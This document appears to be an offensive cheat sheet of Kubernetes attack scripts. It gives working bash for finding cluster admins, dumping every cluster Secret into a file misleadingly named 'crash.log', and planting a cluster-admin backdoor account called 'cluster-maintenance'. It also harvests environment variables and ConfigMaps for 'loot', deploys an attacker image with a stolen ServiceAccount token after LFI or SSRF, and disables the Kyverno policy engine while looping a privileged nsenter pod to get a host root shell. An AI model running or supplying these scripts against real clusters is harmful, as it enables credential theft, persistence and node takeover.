# Kubernetes malicious commands 

Keep in mind that additional info is present [here](https://team-recon-black-ops.github.io/maldev-blog/containers/kubernetes/) 

## Summary
- [Kubernetes malicious commands](#kubernetes-malicious-commands)
  - [Summary](#summary)
  - [Search for ClusterAdmins](#search-for-clusteradmins)
  - [Dump all Secrets of the Cluster](#dump-all-secrets-of-the-cluster)
  - [Create a ClusterRole with ClusterAdmin privileges](#create-a-clusterrole-with-clusteradmin-privileges)
  - [Search for loot in Environment Variables that were added in Deployment YAMLs](#search-for-loot-in-environment-variables-that-were-added-in-deployment-yamls)
  - [Dump ConfigMaps of the Cluster](#dump-configmaps-of-the-cluster)
  - [Spawn a pod from within a Pod using the auto mounted ServiceAccount Token](#spawn-a-pod-from-within-a-pod-using-the-auto-mounted-serviceaccount-token)
  - [Kill Kyverno Policy Engine](#kill-kyverno-policy-engine)

## Search for ClusterAdmins

```bash
kubectl get clusterrolebinding | grep -i cluster-admin
```

## Dump all Secrets of the Cluster
This requires to be very privileged and persist the output as "crash.log" in the current working directory

```bash
#!/bin/bash

output_file="crash.log"

if [ -f $output_file ] ; then
    rm $output_file
fi

namespaces=$(kubectl get ns -o jsonpath="{.items[*].metadata.name}")

for namespace in $namespaces; do
    secrets=$(kubectl get secrets -n $namespace -o jsonpath="{.items[*].metadata.name}")

    for secret in $secrets; do
        echo "Namespace: $namespace, Secret: $secret" >> $output_file
        kubectl get secret $secret -n $namespace -o yaml >> $output_file
        echo "---" >> $output_file
    done
done
```
## Create a ClusterRole with ClusterAdmin privileges

```bash
#!/bin/bash

namespace="default"
cluster_admin_username="cluster-maintenance"
service_account_name="cluster-maintenance"


kubectl create clusterrolebinding $cluster_admin_username \
  --user=$cluster_admin_username \
  --clusterrole=cluster-admin

kubectl create serviceaccount $service_account_name --namespace=$namespace
sleep 5

kubectl create clusterrolebinding myrolebinding --clusterrole=cluster-admin --serviceaccount=default:racoon-rumble

secret_name=$(kubectl get serviceaccount $service_account_name -o=jsonpath='{.secrets[0].name}' --namespace=$namespace)

access_token=$(kubectl get secret $secret_name -o=jsonpath='{.data.token}' --namespace=$namespace | base64 --decode)
  
echo "Cluster-admin user: $cluster_admin_username"
echo "ServiceAccount name: $service_account_name"
echo "Access Token: $access_token"
```

## Search for loot in Environment Variables that were added in Deployment YAMLs

```bash
#!/bin/bash

# Empty the output file
> info.log


for namespace in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}')
do

  for deployment in $(kubectl -n $namespace get deploy -o jsonpath='{.items[*].metadata.name}')
  do
    echo "---" >> info.log
    echo "Namespace: $namespace" >> info.log
    echo "Deployment: $deployment" >> info.log
    kubectl -n $namespace get deploy $deployment -o yaml >> info.log

    echo "Environment Variables:" >> info.log
    kubectl -n $namespace get deploy $deployment -o jsonpath='{.spec.template.spec.containers[*].env}' >> info.log
    echo "Image:" >> info.log
    kubectl -n $namespace get deploy $deployment -o jsonpath='{.spec.template.spec.containers[*].image}' >> info.log
    echo "Network Configuration:" >> info.log
    kubectl -n $namespace get deploy $deployment -o jsonpath='{.spec.template.spec.containers[*].ports}' >> info.log
  done
done
```

## Dump ConfigMaps of the Cluster

```bash
#!/bin/bash
output_file="crash-config.log"
if [ -f $output_file ]; then
    rm $output_file
fi
namespaces=$(kubectl get ns -o jsonpath="{.items[*].metadata.name}")

for namespace in $namespaces; do
    configmaps=$(kubectl get configmaps -n $namespace -o jsonpath="{.items[*].metadata.name}")
    for configmap in $configmaps; do
        echo "Namespace: $namespace, ConfigMap: $configmap" >> $output_file
        kubectl get configmap $configmap -n $namespace -o yaml >> $output_file
        echo "---" >> $output_file
    done
done
```
## Spawn a pod from within a Pod using the auto mounted ServiceAccount Token 

This comes in handy if you managed it to get LFI or an SSRF vulnerability

```bash
#!/bin/sh

API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

YAML_MANIFEST=$(cat <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: debug-pod
  namespace: ${NAMESPACE}
  labels:
    app: mtkpi
spec:
  containers:
  - name: debug-pod
    image: r0binak/mtkpi:v1.4 
    ports:
    - containerPort: 7681
EOF
)

curl -k -X POST "${API_SERVER}/apis/apps/v1/namespaces/${NAMESPACE}/deployments" \
    -H "Authorization: Bearer ${TOKEN}" \
    -H "Content-Type: application/yaml" \
    --data-binary "${YAML_MANIFEST}"
```

## Kill Kyverno Policy Engine

```bash
SVCIP="$(kubectl get svc -n kyverno kyverno-svc --output jsonpath='{.spec.clusterIP}')"
PODNAME="$(kubectl get pod -n kyverno -l app.kubernetes.io/component=admission-controller --output name | sed -e 's/^pod\///g')"
PODIP="$(kubectl get pod -n kyverno $PODNAME --output jsonpath='{.status.podIP}')"
kubectl apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: attack
spec:
  selector:
    matchLabels:
      app: attack
  template:
    metadata:
      labels:
        app: attack
    spec:
      containers:
      - image: nginx:latest
        name: nginx
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: attack
spec:
  type: ClusterIP
  selector:
    app: attack
  ports:
  - name: https
    protocol: TCP
    port: 9443
    targetPort: 80
  externalIPs:
    - $PODIP
    - $SVCIP
EOF
# ATTACK!
while true; do
  kubectl scale deployment.v1.apps/attack --replicas=2;
  kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"busybox","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}';
  kubectl scale deployment.v1.apps/attack --replicas=3;
done
```


